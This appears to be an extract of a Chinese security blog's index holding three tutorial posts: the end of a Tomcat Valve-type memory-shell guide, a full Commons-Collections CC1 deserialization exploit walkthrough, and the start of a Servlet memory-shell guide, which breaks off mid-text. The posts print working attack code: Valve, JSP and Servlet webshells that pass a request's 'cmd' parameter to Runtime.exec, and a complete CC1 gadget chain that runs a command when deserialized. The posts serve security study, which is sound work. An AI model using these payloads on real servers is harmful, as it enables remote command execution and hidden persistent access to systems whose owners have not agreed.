req.getClass().getDeclaredField(\"request\");  \n FieldReq.setAccessible(true);  \n Request request = (Request) FieldReq.get(req);  \n StandardContext standardContext = (StandardContext) request.getContext();  \n standardContext.getPipeline().addValve(new ValveBase() &#123;  \n                @Override  \n public void invoke(Request request, Response response) throws IOException, ServletException &#123;  \n  \n                &#125;  \n            &#125;);  \n resp.getWriter().write(\"inject success\");  \n &#125; catch (Exception e) &#123;  \n        &#125;  \n    &#125;  \n&#125;\n\n再到我们 ValveBase 这个子类里面去，编写我们的恶意代码。\nclass ValveShell extends ValveBase&#123;  \n  \n    @Override  \n public void invoke(Request request, Response response) throws IOException, ServletException &#123;  \n        System.out.println(\"111\");  \n try &#123;  \n            Runtime.getRuntime().exec(request.getParameter(\"cmd\"));  \n &#125; catch (Exception e) &#123;  \n  \n        &#125;  \n    &#125;  \n&#125;\n\n测试成功！\n\n\nJSP 版本的代码如下\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>  \n&lt;%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>  \n&lt;%@ page import=\"org.apache.catalina.core.StandardContext\" %>  \n&lt;%@ page import=\"javax.servlet.*\" %>  \n&lt;%@ page import=\"javax.servlet.annotation.WebServlet\" %>  \n&lt;%@ page import=\"javax.servlet.http.HttpServlet\" %>  \n&lt;%@ page import=\"javax.servlet.http.HttpServletRequest\" %>  \n&lt;%@ page import=\"javax.servlet.http.HttpServletResponse\" %>  \n&lt;%@ page import=\"java.io.IOException\" %>  \n&lt;%@ page import=\"java.lang.reflect.Field\" %>  \n&lt;%@ page import=\"org.apache.catalina.Wrapper\" %>  \n&lt;%@ page import=\"org.apache.catalina.connector.Request\" %>  \n&lt;%@ page import=\"org.apache.catalina.valves.ValveBase\" %>  \n&lt;%@ page import=\"org.apache.catalina.connector.Response\" %>  \n  \n&lt;%  \n class EvilValve extends ValveBase &#123;  \n  \n @Override  \n public void invoke(Request request, Response response) throws IOException, ServletException &#123;  \n System.out.println(\"111\");  \n try &#123;  \n Runtime.getRuntime().exec(request.getParameter(\"cmd\"));  \n &#125; catch (Exception e) &#123;  \n  \n &#125; &#125; &#125;%>  \n  \n&lt;%  \n // 更简单的方法 获取StandardContext  \n Field reqF = request.getClass().getDeclaredField(\"request\");  \n reqF.setAccessible(true);  \n Request req = (Request) reqF.get(request);  \n StandardContext standardContext = (StandardContext) req.getContext();  \n  \n standardContext.getPipeline().addValve(new EvilValve());  \n  \n out.println(\"inject success\");  \n%>\n\n0x05 小结总结一下 Valve 型内存马，感觉在学会 Servlet 内存马之后，看 Valve 内存马就和喝汤一样容易，建议师傅们也尝试手写一下 EXP。\n总而言之，Valve 型内存马是基于 Servlet 内存马来实现的，但是在表现形式上面会稍微有一点区别，之前 Servlet 内存马，我们是写入了一个路径，但是 Valve 型内存马可以在 Servlet 被读取的过程中就直接被恶意触发。\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化Commons-Collections篇01-CC1链","url":"/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/","content":"\n本文首发于 FreeBuf https://www.freebuf.com/articles/web/335892.html\n\n\nJava反序列化CommonsCollections篇01-CC1链0x01 前言反序列化的漏洞，find usages 的部分，都建议大家手动去找一找，\n0x02 环境搭建\nJDK8u65\nopenJDK 8u65\nMaven 3.6.3(其余版本可以先试试，不行再降版本)\n\n\n当时环境搭建踩了好多坑，😭😭😭😭😭😭 多亏了 mikufans师傅\n\n首先 jdk 版本这里，要求的是 jdk8u65 的，如果我们用 jdk8u71 这种，CC 链的漏洞就被修掉了，用不了。\njdk8u65下载链接\n再接着，创建一个 IDEA 项目，选中 maven，并使用 jdk8u65\n\n\n创建完成之后，选中 Project Structure，修改 Modules\n\n\n再添加 Maven 中，对 CC1 链的依赖包。\n&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->  \n&lt;dependency>  \n &lt;groupId>commons-collections&lt;/groupId>  \n &lt;artifactId>commons-collections&lt;/artifactId>  \n &lt;version>3.2.1&lt;/version>  \n&lt;/dependency>\n\n使用 maven clean + maven install\n很不幸的是，我这里报错了，报错内容为org.codehaus.plexus.components.io.resources.PlexusIoResourceCollection\n后续，我点击了 Maven Download Source 就可以用了。\n\n\n\n再说一说如何验证环境导入成功吧，我们 import CC 的包\n\nimport org.apache.commons.collections.functors.InvokerTransformer;\n\n如果成功说明安装成功了 ~\n我们还要做一件事，修改 sun 包。\n因为我们打开源码，很多地方的文件是 .class 文件，是已经编译完了的文件，都是反编译代码，我们很难读懂，所以需要把它转换为 .java 文件。\n\nopenJDK 8u65 ———— 去到这个下载链接，点击 zip\n\n\n\n将其解压之后，先搁一边，我们解压 jdk8u65 的 src.zip，解压完之后，我们把 openJDK 8u65 解压出来的 sun 文件夹拷贝进 jdk8u65 中，这样子就能把 .class 文件转换为 .java 文件了。\n\n\n0x03 Common-Collections 相关介绍闪烁之狐大佬说的很清楚了 ~ 我这里借用一下\nApache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。\n\n简单来说，Common-Collections 这个项目开发出来是为了给 Java 标准的 Collections API 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。\n\n包结构介绍\norg.apache.commons.collections – CommonsCollections自定义的一组公用的接口和工具类\norg.apache.commons.collections.bag – 实现Bag接口的一组类\norg.apache.commons.collections.bidimap – 实现BidiMap系列接口的一组类\norg.apache.commons.collections.buffer – 实现Buffer接口的一组类\norg.apache.commons.collections.collection –实现java.util.Collection接口的一组类\norg.apache.commons.collections.comparators– 实现java.util.Comparator接口的一组类\norg.apache.commons.collections.functors –Commons Collections自定义的一组功能类\norg.apache.commons.collections.iterators – 实现java.util.Iterator接口的一组类\norg.apache.commons.collections.keyvalue – 实现集合和键&#x2F;值映射相关的一组类\norg.apache.commons.collections.list – 实现java.util.List接口的一组类\norg.apache.commons.collections.map – 实现Map系列接口的一组类\norg.apache.commons.collections.set – 实现Set系列接口的一组类\n\n0x04 TransformMap版CC1攻击链分析\n首先我们再次明确一下反序列化的攻击思路。\n\n入口类这里，我们需要一个 readObject 方法，结尾这里需要一个能够命令执行的方法。我们中间通过链子引导过去。所以我们的攻击一定是从尾部出发去寻找头的，流程图如下。\n\n\n1. 寻找尾部的 exec 方法\n总结出前人挖洞的思路，我们这里加速，去到 Transformer 接口看一看\n\n快捷键 ctrl + alt + B，查看实现接口的类。\n\n\n我先是寻找了 MapTransformer，再寻找了 InvokerTransformer 成功找到了我们需要的尾部 ———— 命令执行\n\n在 InvokerTransformer 类中存在一个反射调用任意类，可以作为我们链子的终点。\n\n\n\n看到这里有漏洞，我们先尝试构造一下，调用这个类的弹计算器。\n在调用这个类之前，我们先回顾一下反射的命令执行的代码。\nimport org.omg.SendingContext.RunTime;  \n  \nimport java.lang.reflect.Method;  \n  \npublic class InvokeTransformerTest &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Runtime runtime = Runtime.getRuntime();  \n Class c = Runtime.class;  \n Method method = c.getDeclaredMethod(\"exec\", String.class);  \n method.setAccessible(true);  \n method.invoke(runtime, \"calc\");  \n &#125;  \n&#125;\n\n\n\n接下来我们构造一个利用 InvokerTransformer 类弹计算器的程序。\n根据构造方法构造 EXP，因为是 public 的方法，这里无需反射。\n\n\nimport org.apache.commons.collections.functors.InvokerTransformer;  \n  \nimport java.lang.reflect.Method;  \n  \npublic class InvokeTransformerTest &#123;  \n    public static void main(String[] args) &#123;  \n        Runtime runtime = Runtime.getRuntime();  \n InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;  \n                , new Object[]&#123;\"calc\"&#125;);  \n invokerTransformer.transform(runtime);  \n &#125;  \n&#125;\n\n\n\n\n注意我们最后一句 invokerTransformer.transform(runtime);\n所以我们下一步的目标是去找调用 transform 方法的不同名函数\n\n2. 初步寻找链子右键 —&gt; find usages，如果 find usages 这里有问题的话，可以先 Ctrl+Alt+Shift+F7，选择 All place 查询。\n节省时间，我这里直接把结果贴出来。\n其中 TransformedMap 类中存在 checkSetValue() 方法调用了 transform() 方法。\n\n\n\nOK，接下来我们去看一看 valueTransformer.checkSetValue 的 valueTransformer 是什么东西，最终在 TransformedMap 的构造函数中发现了 valueTransformer\n\n\n\n\n因为 TransformedMap 的构造方法作用域是 protected，我们还需要去找一找谁调用了 TransformedMap 的构造方法。\n\n在 decorate() 静态方法中创建了 TransformedMap 对象\n\n\n到这一步，尝试将其作为链子的开头，编写 POC\nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.TransformedMap;  \n  \nimport java.lang.reflect.Method;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class decorateCalc &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Runtime runtime = Runtime.getRuntime();  \n InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\"  \n , new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n Map decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);  \n Class&lt;TransformedMap> transformedMapClass = TransformedMap.class;  \n Method checkSetValueMethod = transformedMapClass.getDeclaredMethod(\"checkSetValue\", Object.class);  \n checkSetValueMethod.setAccessible(true);  \n checkSetValueMethod.invoke(decorateMap, runtime);  \n &#125;  \n&#125;\n\n再顺带讲一讲这个链子是怎么构造出来的吧，这里讲一遍，之后的就不讲了。\n\n先明确一下思路，尾部链子，也就是我们要利用的漏洞，是因为 invokeTransformer 的 transform 方法可以进行反射的命令执行。\n在执行 .decorate 方法的时候，会新建 TransformedMap 对象，我们调用对象的 checkSetValue 方法（因为我们无法直接获取 TransformedMap 对象，它的作用域是 protected）。\n在 checkSetValue 方法当中，会执行 .transform 的方法。这也就是我们链子的尾部 ———— .transform\n\n\n\n这么一看，调用 .decorate 方法就很有必要了，这几句语句是为了运用 .decorate 方法而存在的。\nInvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\"  \n , new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;);  \nHashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \nMap decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);\n\n接着，因为 .decorate 方法被调用，我们可以新建 TransformedMap 对象了\nClass&lt;TransformedMap> transformedMapClass = TransformedMap.class;\n\n再通过反射构造攻击手段\nMethod checkSetValueMethod = transformedMapClass.getDeclaredMethod(\"checkSetValue\", Object.class);  \ncheckSetValueMethod.setAccessible(true);  \ncheckSetValueMethod.invoke(decorateMap, runtime);\n\n至此 Poc 就构造完毕了 ~\n\n\n3. 完整链子\n目前找到的链子位于 checkSetValue 当中，去找 .decorate 的链子，发现无法进一步前进了，所以我们回到 checkSetValue 重新找链子。\n\n继续 find usages，找到了 parent.checkSetValue(value); 调用了 checkSetValue\n\n\n我们点进去看，发现这是一个抽象类，是 TransformedMap 的父类。\n\n调用 checkSetValue 方法的类是 AbstractInputCheckedMapDecorator 类中的一个内部类 MapEntry\n\n\n\nsetValue() 实际上就是在 Map 中对一组 entry（键值对）进行 setValue() 操作。\n\n这里细心跟一下是可以跟到的\n\n\n所以，我们在进行 .decorate 方法调用，进行 Map 遍历的时候，就会走到 setValue() 当中，而 setValue() 就会调用 checkSetValue\n\n我们可以写一段代码来调试一下，看一看在遍历 Map 的时候，会不会走到 setValue 中。在 setValue 的 192 行打个断点，并修改一下我们的 Poc\n  import org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.TransformedMap;  \n  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \npublic class SetValueTest01 &#123;  \n    public static void main(String[] args) &#123;  \n        Runtime runtime = Runtime.getRuntime();  \n InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\"  \n , new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n hashMap.put(\"key\", \"value\");  \n Map&lt;Object, Object> decorateMap = TransformedMap.decorate(hashMap, null, invokerTransformer);  \n for (Map.Entry entry:decorateMap.entrySet())&#123;  \n            entry.setValue(runtime);  \n &#125;  \n    &#125;  \n&#125;\n\n诶嘿！果然跳进来了，并且在代码执行完后也会弹出计算器\n\n\n\n到此处，我们的攻击思路出来了，找到一个是数组的入口类，遍历这个数组，并执行 setValue 方法，即可构造 Poc。\n\n一句话概括一下\n\n如何遍历一个Map最终执行 setValue() 方法\n\n如果能找到一个 readObject() 里面调用了 setValue() 就太好了\n4. 寻找 readObject() ———— 链首\n之前链子是到 setValue 的，所以我们在 setValue 处，find usages\n\n成功找到了一个 readObject() 的入口类！\n\n\n\n我们注意到类的名字为 AnnotationInvocationHandler，InvocationHandler 这个后缀，我在动态代理里面提到过，是用做动态代理中间处理，因为它继承了 InvocationHandler 接口。\n\n要调用 setValue() 方法，我们需要完成下图的要求。\n\n\n然后，readObject 的方法是类 AnnotationInvocationHandler 的，AnnotationInvocationHandler 的作用域为 default，我们需要通过反射的方式来获取这个类及其构造函数，再实例化它。\n\n\n\n下面我们来手写 EXP\n\n0x05 TransformMap版CC1手写 EXP1. 理想情况下的 EXP\n先想出理想情况下的 EXP，再根据实际情况进行调整\n\npackage FinalEXP;\n\nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.TransformedMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Constructor;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 理想情况的 EXPpublic class TransformMapImagineEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n  \n        Runtime runtime = Runtime.getRuntime();  \n InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\"  \n , new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n hashMap.put(\"key\", \"value\");  \n Map&lt;Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);  \n Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  \n aihConstructor.setAccessible(true);  \n Object o = aihConstructor.newInstance(Override.class, transformedMap);  \n  \n // 序列化反序列化  \n serialize(o);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n目前有三个亟待解决的问题\n\n\n①：Runtime 对象不可序列化，需要通过反射将其变成可以序列化的形式。\n\n\n②：setValue() 的传参，是需要传 Runtime 对象的；而在实际情况当中的 setValue() 的传参是这个东西\n\n\n\n\n③：解决上文提到的，要进入 setValue 的两个 if 判断\n\n2. 解决问题 ① Runtime 不能序列化Runtime 是不能序列化的，但是 Runtime.class 是可以序列化的。我们先写一遍普通反射。\npackage FinalEXP;  \n  \nimport java.lang.reflect.Method;  \n  \npublic class SolvedProblemRuntime &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Class c = Runtime.class;  \n Method method = c.getMethod(\"getRuntime\");  \n Runtime runtime = (Runtime) method.invoke(null, null);  \n Method run = c.getMethod(\"exec\", String.class);  \n run.invoke(runtime, \"calc\");  \n &#125;  \n&#125;\n\n接着，我们将这个反射的 Runtime 改造为使用 InvokerTransformer 调用的方式。\n\n\n稍微理一理可以看到，上方主函数最后三行代码有一个共同点就是：\n\n格式都为 new InvokerTransformer().invoke()\n后一个 invoke() 方法里的参数都是前一个的结果\n\n从代码的复用性角度来说，我们应当减少这种复用的工作量，于是我们使用 ChainedTransformer 这个类。\n\n\nChainedTransformer 类下的 transform 方法递归调用了前一个方法的结果，作为后一个方法的参数。\n\n知道了用法之后编写 EXP，先定义一个数组，然后将数组传到 ChainedTransformer 类中，再调用 .transform 方法。\n\npackage FinalEXP;  \n  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \n  \npublic class ChainedTransformerEXP &#123;  \n    public static void main(String[] args) &#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new InvokerTransformer(\"getMethod\"  \n , new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\"  \n , new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n chainedTransformer.transform(Runtime.class);  \n &#125;  \n&#125;\n\n再把它与 decorate 的链子结合一下\npackage FinalEXP;  \n  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.map.TransformedMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Constructor;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 解决了第一个问题  \npublic class ChainedTransformerEXP &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n                new InvokerTransformer(\"getMethod\"  \n , new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\"  \n , new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n hashMap.put(\"key\",\"value\");  \n Map&lt;Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  \n Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  \n aihConstructor.setAccessible(true);  \n Object o = aihConstructor.newInstance(Override.class, transformedMap);  \n  \n // 序列化反序列化  \n serialize(o);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n至此，Runtime 的问题已经解决完毕。但是我们的 EXP 运行时不会弹出计算器，是因为我们的 EXP 并没有 transformer 的调用。我们可以调试一下，去看看问题出在哪里。\n\n断点位置：先打在 AnnotationInvocationHandler 的两个 if 判断。\n\n\n调试结果如图\n\n\n我们的 EXP 并没有走到 setValue 中去，而是在第一个 if 就跳出去了。\n3. 解决问题 ② 进入到 setValue 方法\n绕过两个 if，进入 setValue 方法。\n\n第一个 if 语句 if (memberType != null)，跳出来的原因是我们传入的 memberType 为 null 了，为什么会这样呢？我们去看看 memberType 究竟为何方神圣。\n\n\n我们的传参语句\n\n\n我们的要求是，传入的注解参数，是有成员变量的。并且要求 hashMap.put(&quot;para1&quot;, &quot;para2&quot;) 中的 para1 与成员变量相对应。当然这是第二个 if 的事儿了。\n我们点进 Override 中，看看问题是不是出在传参上了。\n\n空空如也，里面是没有成员变量的，我们要去找另外的注解。\n\n\n\n这里我们用 Target.class 尝试一下，点进 Target，当中有一个成员变量为 value，所以我们 hashmap.put 也需要修改为 value。\n\n\n修改完毕，我们再 debug 一下。\n这一次的运行我们成功进入到了 setValue 方法当中，但还是不能够进行弹计算器，继续分析原因。\n\n\n我们继续往下跟程序，发现 setValue() 处中的参数并不可控，而是指定了 AnnotationTypeMismatchExceptionProxy 类，是无法进行命令执行的。\n我们需要找到一个类，能够可控 setValue 的参数。\n4. 解决最终问题，编写 EXP\n我们这里找到了一个能够解决 setValue 可控参数的类 ———— ConstantTransformer。\n\n这个类完美符合我们的要求，点进去看一看。\n\n\n\n构造方法：传入的任何对象都放在 iConstant 中\ntransform() 方法：无论传入什么，都返回 iConstant，这就类似于一个常量了。\n\n那么我们可以利用这一点，将 AnnotationTypeMismatchExceptionProxy 类作为 transform() 方法的参数，也就是这个无关的类，作为参数，我们先传入一个 Runtime.class，然后无论 transform() 方法会调用什么对象，都会返回 Runtime.class\n编写我们的终极 EXP\npackage FinalEXP;  \n  \nimport org.apache.commons.collections.Transformer;  \nimport org.apache.commons.collections.functors.ChainedTransformer;  \nimport org.apache.commons.collections.functors.ConstantTransformer;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.map.TransformedMap;  \n  \nimport java.io.*;  \nimport java.lang.annotation.Target;  \nimport java.lang.reflect.Constructor;  \nimport java.util.HashMap;  \nimport java.util.Map;  \n  \n// 最终的 EXPpublic class TransformMapEXP &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        Transformer[] transformers = new Transformer[]&#123;  \n            new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  \n new InvokerTransformer(\"getMethod\",  \n new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", null&#125;),  \n new InvokerTransformer(\"invoke\"  \n , new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),  \n new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)  \n        &#125;;  \n ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  \n HashMap&lt;Object, Object> hashMap = new HashMap&lt;>();  \n hashMap.put(\"value\",\"drunkbaby\");  \n Map&lt;Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  \n Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");  \n Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  \n aihConstructor.setAccessible(true);  \n Object o = aihConstructor.newInstance(Target.class, transformedMap);  \n  \n // 序列化反序列化  \n serialize(o);  \n unserialize(\"ser.bin\");  \n &#125;  \n    public static void serialize(Object obj) throws IOException &#123;  \n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));  \n oos.writeObject(obj);  \n &#125;  \n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;  \n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  \n Object obj = ois.readObject();  \n return obj;  \n &#125;  \n&#125;\n\n\n\n0x06 小结\n先总结一下我们的利用链\n\n利用链：\nInvokerTransformer#transform\n    TransformedMap#checkSetValue\n        AbstractInputCheckedMapDecorator#setValue\n            AnnotationInvocationHandler#readObject\n使用到的工具类辅助利用链：\nConstantTransformer\nChainedTransformer\nHashMap\n\n这里非常建议大家在跟完一整个链子之后，写一个流程图，让自己明确一下思路，这个流程图一定是要自己写。\n","categories":["Java"],"tags":["Java"]},{"title":"Java内存马系列-05-Tomcat 之 Servlet 型内存马","url":"/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/","content":"Tomcat 之 Servlet 型内存马\n\nJava 内存马系列-05-Tomcat 之 Servlet 型内存马0x01 前言感觉 Servlet 内存马这块是千人千语吧，难度实在是不小，光是不同 Tomcat 获取 Context 就需要不少，而且 Servlet 还有动态注册一说，难度还是蛮大的。\n\n本文还是从流程 ————&gt; 分析 ————&gt; PoC 这一角度来看内存马\n\n0x02 Servlet 创建早在我最前面的一篇，关于 Java 内存马的基础文章里面提到过 Servlet，在我眼里它是半个中间件。流程是 init() —-&gt; doXXX —-&gt; destory()\n这里我们可以先看一下 Servlet 这个接口有哪些方法\n\n\nServlet 接口分别有如下几个方法：\npublic interface Servlet &#123;  \n   void init(ServletConfig var1) throws ServletException; // init方法，创建好实例后会被立即调用，仅调用一次。  \n  \n   ServletConfig getServletConfig();//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数  \n  \n   void service(ServletRequest var1, ServletResponse var2) throws ServletException, IOException;  //每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。  \n  \n   String getServletInfo();//返回有关servlet的信息，如作者、版本和版权.  \n  \n   void destroy();//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源  \n&#125;\n\n从 Servlet 接口里面我们可以看得出来，如果我们要写恶意代码，应该是写在 service() 方法里面，所以这里我们直接创建一个恶意的 Servlet，代码如下。\npackage tomcatShell.Servlet;  \n  \nimport javax.servlet.*;  \nimport javax.servlet.annotation.WebServlet;  \nimport java.io.IOException;  \n  \n// 基础恶意类   \npublic class ServletTest implements Servlet &#123;  \n    @Override  \n public void init(ServletConfig config) throws ServletException &#123;  \n  \n    &#125;  \n  \n    @Override  \n public ServletConfig getServletConfig() &#123;  \n        return null;  \n &#125;  \n  \n    @Override  \n public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;  \n        String cmd = req.getParameter(\"cmd\");  \n if (cmd !=null)&#123;  \n            try&#123;  \n                Runtime.getRuntime().exec(cmd);  \n &#125;catch (IOException e)&#123;  \n                e.printStackTrace();  \n &#125;catch (NullPointerException n)&#123;  \n                n.printStackTrace();  \n &#125;  \n        &#125;  \n    &#125;  \n  \n    @Override  \n public String getServletInfo() &#123;  \n        return null;  \n &#125;  \n  \n    @Override  \n public void destroy() &#123;  \n  \n    &#125;  \n&#125;\n\n并且配置 web.xml，这里最好配一下，如果不配后续的分析会比较难。\n测试一下，成功！\n\n\n0x03 Servlet 流程分析\n前情剧透：Servlet 的流程分析比 Filter 和 Listener 复杂一些\n\n因为 Web 应用程序的顺序是 Listener —-&gt; Filter —-&gt; Servlet，所以我们在调用 Servlet 的时候也会看到之前的 Listener 与 Filter 的流程。\n\n如图，这里我先把断点下在了 service() 方法，我们可以看到这个地方是有 Filter 的流程的。\n\n\n\n\n正式开始分析，我们把断点下在 init() 方法这里。\n\n\n\n获取到 HTTP 请求这里我们肯定还要回去，从前面开始分析。也就是把断点下到 HTTP11Processor 类的 service() 方法，重新开始调试。\n\n\n这个 HTTP11Processor 类是一个网络请求的类，它的作用是处理数据包，而它的 service() 方法主要是在处理 HTTP 包的请求头，主要做了赋值的工作，后续会通过 ByteBuff 进行数据解析。\n所以这一块并不是很重要，都是一些基础的赋值，我们继续往下走，直接到 343 行这里\nthis.getAdapter().service(this.request, this.response);\n\n\n\n跟进，我们去到的是 CototeAdapter 类的 service() 方法里， CoyoteAdapter 是 Processor 和 Valve 之间的适配器。\n\n\n首先我们关注传参，传入的参数是 org.apache.coyote.Request 和 org.apache.coyote.Response 类型的对象，后面又进行了 getNote() 方法的调用。\n\n\n\n对应的 getNote() 方法\n\n\n\n这两个 getNote() 方法都是取 notes 数组里指定 pos 的对象，也就是去 notes[1] 的这个对象，note[1] 的的值是在 CoyoteAdapter#service 里设值的。\n我们继续往下看，如果 request == null，进行一系列的赋值。\n\n\n后续也都是一些基础的赋值啥的，直到 353 行这里\nthis.connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);\n\n这一行是 service() 方法里最关键的步骤了\n\n\n比较复杂，我们要逐个分析，首先是变量名 connector，它里面存了我们一整个的 HTTP 包。\n\n\n这里师傅们可以逐个点进去看一下\nconnector.getService() 返回的是 Connector 关联的 Service 属性，也就是 StandardService 类型的对象。  \n\n\nconnector.getService().getContainer() 返回的是 Service 里的容器 Engine 属性，也就是 StandardEngine 对象。\n\n\nconnector.getService().getContainer().getPipeline() 返回的是 StandardEngine 里的 Pipeline 属性，也就是 StandardPipeline 对象。\n\n\n返回的是 StandardPipeline 的 Valve 类型的数行 first 或者 basic\n\n\n这里感觉获取不到什么有用的信息，所以直接跳进 invoke() 方法， StandardEngineValve#inovke() 进行了 host 相关的简单判断。再继续往下，host 是 Tomcat 内置的 host。\n后续的内容就和 Filter 很类似，也就是多个 invoke 的调用，综上，这其实是一个获取到 HTTP 请求，进行预处理的过程。\n读取 web.xml这里的断点位置是 ContextConfig#webConfig()，读取 web.xml 的流程与 Listener 型内存马里面基本类似，但是还是有点不同。\n\n断点位置如图\n\n\n\n开始调试，首先我们获取到了此项目里面的 web.xml 文件\n\n\n中间内容是处理 Filter，Listener 等信息的代码，所以这里我们直接跳过，到 1115 行的 configureContext(webXml); 中去\n\n\n跟进，我们看到 configureContext() 方法也是先获取 Listener，Filter，还有 localeEncodingMappings 等，继续往下走，直到 1281 行这里，开始进行 Servlet 的读取。\n\n\n创建与装载 StandardWrapper1282 行的语句，createWrapper()，实际上就是创建了 StandardWrpper，后续代码会对它进行加载与处理。\n继续往下走，这里很明显，我们将所有的 servlets 保存到了 Wrapper 里面，如图。后面代码做的很大一部分工作都是在把 web.xml 里面的数据写到 StandardWrapper 里面\n\n\n我们继续往下看，后续都是一些添加的操作了，这里我们先跳过了。继续往下看，1334 行，将 Wrapper 添加到 context 